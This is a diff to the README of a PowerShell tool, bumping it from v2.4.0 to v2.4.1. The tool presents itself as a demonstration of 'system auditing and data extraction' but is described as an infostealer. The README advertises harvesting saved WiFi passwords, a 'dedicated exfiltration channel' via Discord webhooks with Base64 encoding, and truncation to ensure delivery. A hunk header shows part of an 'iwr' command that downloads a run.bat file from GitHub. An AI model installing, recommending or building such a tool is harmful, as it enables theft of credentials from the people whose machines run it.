@@ -51,7 +51,7 @@ iwr https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat -OutF
 
 ---
 
-## 📋 What This Tool Does (v2.4.0)
+## 📋 What This Tool Does (v2.4.1)
 
 This PowerShell script demonstrates advanced system auditing and data extraction techniques by:
 
@@ -64,9 +64,9 @@ This PowerShell script demonstrates advanced system auditing and data extraction
 
 ---
 
-## 🚀 New in v2.4.0
+## 🚀 New in v2.4.1
 
-- **Discrete Naming**: Functions renamed to follow standard PowerShell approved verbs (e.g., `Get-EnvironmentMetrics`).
+- **WiFi Filter**: Automatically filters out networks with no password saved or open networks from the report.
 - **Discord Integration**: Dedicated exfiltration channel via Discord Webhooks with Base64 encoding.
 - **Improved Stability**: Fixed syntax errors, string terminators, and block definitions.
 - **Data Integrity**: Added content truncation for Discord's 2000-character limit to ensure delivery.
